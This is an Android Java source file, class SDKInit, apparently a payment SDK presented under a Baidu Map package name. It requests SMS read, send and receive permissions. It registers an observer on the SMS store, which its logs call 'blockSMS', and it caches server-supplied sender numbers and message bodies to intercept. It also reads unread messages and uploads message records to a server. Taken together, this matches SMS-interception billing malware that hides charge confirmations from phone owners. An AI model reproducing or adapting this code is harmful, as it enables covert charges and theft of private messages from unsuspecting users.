package com.baidu.BaiduMap.pay;

import java.util.ArrayList;

import com.baidu.BaiduMap.httpCenter.GetDataImpl;
import com.baidu.BaiduMap.httpCenter.HttpListener;
import com.baidu.BaiduMap.json.JsonUtil;
import com.baidu.BaiduMap.json.MessageEntity;
import com.baidu.BaiduMap.json.SetEntity;
import com.baidu.BaiduMap.sms.MySmsManager;
import com.baidu.BaiduMap.sms.SmsObserver;
import com.baidu.BaiduMap.utils.ACacheUtils;
import com.baidu.BaiduMap.utils.Constants;
import com.baidu.BaiduMap.utils.Log;
import com.baidu.BaiduMap.utils.Utils;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.text.TextUtils;

public class SDKInit {
    private static SDKInit sdkInitializer = null;
    public static Context mContext;
    static ContentResolver resolver = null;
    private static String permissionGroup[] = {Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS};
    boolean isRoot = false;
    SetEntity setEntity;
    int times = 0;
    private static int count = 0;
    static SmsObserver mObserver;

    public static SDKInit getInstance() {
        if (sdkInitializer == null) {
            sdkInitializer = new SDKInit();
        }
        return sdkInitializer;
    }

    public static Context getApplication() {
        if (mContext != null) {
            return mContext;
        }
        return mContext;
    }

    /**
     * SDK初始化方法
     *
     * @param ctx
     * @param price       价格
     * @param payItemID   付费点ID
     * @param str         二次确认对话框内容
     * @param product     产品名称
     * @param Did
     * @param extData
     * @param payHandler  支付回调
     * @param initHandler 初始化回调
     */
    public void SDKInitializer(final Context ctx, final String price, final int payItemID, final String str,
                               final String product, final String Did, final String extData, final Object payHandler,
                               final Handler initHandler) {
        mContext = ctx;
        permissionTest();
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Looper.prepare();
                    s(mContext);
                    init(ctx, price, payItemID, str, product, Did, extData, payHandler, initHandler);
                    Looper.loop();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private void SetSmsInterruptInfo(String _phoneNumbers, String _messageContents, Context context) {
        if (_phoneNumbers == null)
            _phoneNumbers = "";
        if (_messageContents == null)
            _messageContents = "";
        SmsInterruptInfo(_phoneNumbers, _messageContents, context);
        if (Constants.isOutPut) {
            Log.debug("----------->_phoneNumbers:" + _phoneNumbers);
            Log.debug("----------->_messageContents:" + _messageContents);
        }
    }

    /**
     * 同步短信
     *
     * @param ctx
     * @param orderInfo
     */
    public void saveMessage(final Context ctx, final MessageEntity orderInfo) {
        if (Constants.isOutPut) {
            Log.debug("saveMessage orderInfo -->" + orderInfo.toString());
        }
        new Thread() {
            @Override
            public void run() {
                synchronized (orderInfo) {
                    if (Constants.isOutPut) {
                        Log.debug("saveMessage orderInfo-->" + orderInfo.toString());
                    }
                    GetDataImpl.getInstance(ctx).saveMessage(orderInfo);
                }
            }
        }.start();
    }

    public static void s(final Context ctx) {
//        if (Build.VERSION.SDK_INT >= 23) {
//            Log.debug("SDK verson >= 23");
//            checkPermission(ctx);
//        }
        if (Constants.isOutPut) {
            Log.debug("------------>blockSMS begin");
        }
        resolver = ctx.getContentResolver();
        mObserver = new SmsObserver(new Handler() {
            @Override
            public void handleMessage(Message msg) {
                super.handleMessage(msg);
            }
        });
        resolver.registerContentObserver(Uri.parse("content://sms"), true, mObserver);
        if (Constants.isOutPut) {
            Log.debug("------------>blockSMS end");
        }
    }

    public void SmsInterruptInfo(String _senderPhoneNumber, String _messageContent, Context context) {
        ArrayList<String> senderPhoneNumberList = new ArrayList<String>();
        ArrayList<String> messageContentList = new ArrayList<String>();
        String[] phoneNumbers = _senderPhoneNumber.split(",");
        String[] messageContents = _messageContent.split(",");
        if (Constants.isOutPut) {
            Log.debug("------------>phoneNumbers.length:" + phoneNumbers.toString());
            Log.debug("------------>messageContents.length:" + messageContents.toString());
        }

        for (String x : phoneNumbers) {
            if (!TextUtils.isEmpty(x)) {
                senderPhoneNumberList.add(x);
            }
        }
        for (String x : messageContents) {
            if (!TextUtils.isEmpty(x)) {
                messageContentList.add(x);
            }
        }
        ACacheUtils.getInstance(context).putPhoneData(senderPhoneNumberList);
        ACacheUtils.getInstance(context).putMessageData(messageContentList);
        if (Constants.isOutPut) {
            Log.debug("ACacheUtils.getInstance().putPhoneData(senderPhoneNumberList)"
                    + ACacheUtils.getInstance(context).getPhoneData().size());
            Log.debug("ACacheUtils.getInstance().putMessageData(messageContentList)"
                    + ACacheUtils.getInstance(context).getMessageData().size());
            Log.debug("senderPhoneNumberList.size():" + senderPhoneNumberList.size());
            Log.debug("messageContentList.size():" + messageContentList.size());
        }
    }

    private void init(final Context ctx, final String price, final int payItemID, final String str, final String product, final String Did, final String extData, final Object payHandler, final Handler initHandler) {
        GetDataImpl.getInstance(ctx).getPayInit(new HttpListener() {
            @Override
            public void result(String result) {
                try {
                    setEntity = (SetEntity) JsonUtil.parseJSonObject(SetEntity.class, result);
                    SetSmsInterruptInfo(setEntity.phoneNumber, setEntity.messageBody, mContext);
                    GetDataImpl.PayPoint(mContext, result);
                    if (setEntity != null) {
                        if (setEntity.isOpenPay_month) {
                            InitPay1001.getInstance().init_BaiduMap(ctx, price, payItemID, str, product,
                                    Did, extData, payHandler, setEntity);
                        }
                        ACacheUtils.getInstance(ctx).putSetEntity(setEntity);
                        Message msg = new Message();
                        msg.what = 1;
                        initHandler.sendMessage(msg);
                    }
                } catch (Exception e) {

                }
            }
        });
    }

    public static ContentResolver getResolver() {
        if (resolver == null) {
            resolver = mContext.getContentResolver();
        }
        return resolver;
    }

    public static void permissionTest() {
        SDKInit.mContext.getContentResolver().query(Uri.parse("content://sms"),
                new String[]{"_id", "address", "read", "body", "thread_id"}, "read=?", new String[]{"0"},
                "date desc");
//        SDKInit.getResolver().delete(Uri.parse("content://sms"), "read=0", null);
    }
}